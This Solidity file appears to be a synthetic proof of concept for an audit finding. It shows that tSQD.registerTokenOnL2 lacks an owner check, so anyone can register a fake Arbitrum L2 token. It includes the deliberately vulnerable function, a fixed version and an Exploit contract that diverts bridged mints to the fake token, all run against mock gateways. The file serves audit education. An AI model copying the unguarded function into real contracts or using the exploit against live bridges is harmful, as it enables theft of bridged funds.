// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Subsquid tSQD.registerTokenOnL2 — anyone sets the L2 counterpart
    (Pashov, H-04). SYNTHETIC, cheatcode-free.

    The audited function is copied below. Arbitrum's L1CustomGateway stores
    l1ToL2Token[token] on that call and refuses a later change. The L2
    finalizeInboundTransfer then bridgeMints the stored token. The retryable
    is collapsed into the same gateway so the mint is visible in one block. */

interface IArbEnabled {
    function isArbitrumEnabled() external view returns (uint8);
}

interface IL1CustomGateway {
    function registerTokenToL2(
        address _l2Address,
        uint256 _maxGas,
        uint256 _gasPriceBid,
        uint256 _maxSubmissionCost,
        address _creditBackAddress
    ) external payable returns (uint256);
}

interface IGatewayRouter2 {
    function setGateway(
        address _gateway,
        uint256 _maxGas,
        uint256 _gasPriceBid,
        uint256 _maxSubmissionCost,
        address _creditBackAddress
    ) external payable returns (uint256);
}

contract ArbToken {
    string public symbol;
    uint8 public decimals = 18;
    address public gateway;
    mapping(address => uint256) public balanceOf;

    constructor(string memory sym, address _gateway) {
        symbol = sym;
        gateway = _gateway;
    }

    function bridgeMint(address to, uint256 amount) external {
        require(msg.sender == gateway, "ONLY_GATEWAY");
        balanceOf[to] += amount;
    }
}

contract L1CustomGateway {
    mapping(address => address) public l1ToL2Token;

    function registerTokenToL2(
        address _l2Address,
        uint256,
        uint256,
        uint256,
        address
    ) external payable returns (uint256) {
        require(IArbEnabled(msg.sender).isArbitrumEnabled() == uint8(0xb1), "NOT_ARB_ENABLED");
        address currL2Addr = l1ToL2Token[msg.sender];
        if (currL2Addr != address(0)) {
            require(currL2Addr == _l2Address, "NO_UPDATE_TO_DIFFERENT_ADDR");
        }
        l1ToL2Token[msg.sender] = _l2Address;
        return 1;
    }

    /// L2CustomGateway.finalizeInboundTransfer: mint the registered counterpart.
    function finalizeInboundTransfer(address l1Token, address to, uint256 amount) external {
        address l2Token = l1ToL2Token[l1Token];
        require(l2Token != address(0), "NO_L2_TOKEN");
        ArbToken(l2Token).bridgeMint(to, amount);
    }
}

contract GatewayRouter {
    address public tokenGateway;

    function setGateway(address _gateway, uint256, uint256, uint256, address) external payable returns (uint256) {
        tokenGateway = _gateway;
        return 1;
    }
}

contract tSQD {
    bool internal shouldRegisterGateway;
    IL1CustomGateway gateway;
    IGatewayRouter2 router;

    constructor(address _gateway, address _router) {
        gateway = IL1CustomGateway(_gateway);
        router = IGatewayRouter2(_router);
    }

    /// @dev we only set shouldRegisterGateway to true when in `registerTokenOnL2`
    function isArbitrumEnabled() external view returns (uint8) {
        require(shouldRegisterGateway, "NOT_EXPECTED_CALL");
        return uint8(0xb1);
    }

    function registerTokenOnL2(
        address l2CustomTokenAddress,
        uint256 maxSubmissionCostForCustomGateway,
        uint256 maxSubmissionCostForRouter,
        uint256 maxGasForCustomGateway,
        uint256 maxGasForRouter,
        uint256 gasPriceBid,
        uint256 valueForGateway,
        uint256 valueForRouter,
        address creditBackAddress
    ) public payable virtual {
        require(!shouldRegisterGateway, "ALREADY_REGISTERED");
        shouldRegisterGateway = true;

        // @> VULN: no onlyOwner. The caller picks the L2 token the bridge will mint.
        gateway.registerTokenToL2{value: valueForGateway}(
            l2CustomTokenAddress, maxGasForCustomGateway, gasPriceBid, maxSubmissionCostForCustomGateway, creditBackAddress
        );

        router.setGateway{value: valueForRouter}(
            address(gateway), maxGasForRouter, gasPriceBid, maxSubmissionCostForRouter, creditBackAddress
        );

        shouldRegisterGateway = false;
    }
}

contract tSQDFixed is tSQD {
    address public owner;

    constructor(address _gateway, address _router, address _owner) tSQD(_gateway, _router) {
        owner = _owner;
    }

    function registerTokenOnL2(
        address l2CustomTokenAddress,
        uint256 maxSubmissionCostForCustomGateway,
        uint256 maxSubmissionCostForRouter,
        uint256 maxGasForCustomGateway,
        uint256 maxGasForRouter,
        uint256 gasPriceBid,
        uint256 valueForGateway,
        uint256 valueForRouter,
        address creditBackAddress
    ) public payable override {
        require(msg.sender == owner, "NOT_OWNER");
        require(!shouldRegisterGateway, "ALREADY_REGISTERED");
        shouldRegisterGateway = true;

        gateway.registerTokenToL2{value: valueForGateway}(
            l2CustomTokenAddress, maxGasForCustomGateway, gasPriceBid, maxSubmissionCostForCustomGateway, creditBackAddress
        );

        router.setGateway{value: valueForRouter}(
            address(gateway), maxGasForRouter, gasPriceBid, maxSubmissionCostForRouter, creditBackAddress
        );

        shouldRegisterGateway = false;
    }
}

contract Admin {
    function register(tSQDFixed token, address l2) external {
        token.registerTokenOnL2(l2, 0, 0, 0, 0, 0, 0, 0, address(this));
    }
}

contract Exploit {
    uint256 public constant BRIDGE_AMOUNT = 1000 ether;
    address public constant DEPOSITOR = 0x000000000000000000000000000000000000bEEF;

    L1CustomGateway public gateway; // nonce 1
    GatewayRouter public router; // nonce 2
    ArbToken public fake; // nonce 3
    ArbToken public realL2; // nonce 4
    tSQD public token; // nonce 5

    uint256 public fakeCredited;
    uint256 public realCredited;

    constructor() {
        gateway = new L1CustomGateway();
        router = new GatewayRouter();
        fake = new ArbToken("fSQD", address(gateway));
        realL2 = new ArbToken("tSQD", address(gateway));
        token = new tSQD(address(gateway), address(router));
    }

    function run() external {
        token.registerTokenOnL2(address(fake), 0, 0, 0, 0, 0, 0, 0, address(this));
        require(gateway.l1ToL2Token(address(token)) == address(fake), "fake not pinned");
        gateway.finalizeInboundTransfer(address(token), DEPOSITOR, BRIDGE_AMOUNT);
        fakeCredited = fake.balanceOf(DEPOSITOR);
        realCredited = realL2.balanceOf(DEPOSITOR);
        require(fakeCredited == BRIDGE_AMOUNT, "fake credit");
        require(realCredited == 0, "real was minted");
    }
}
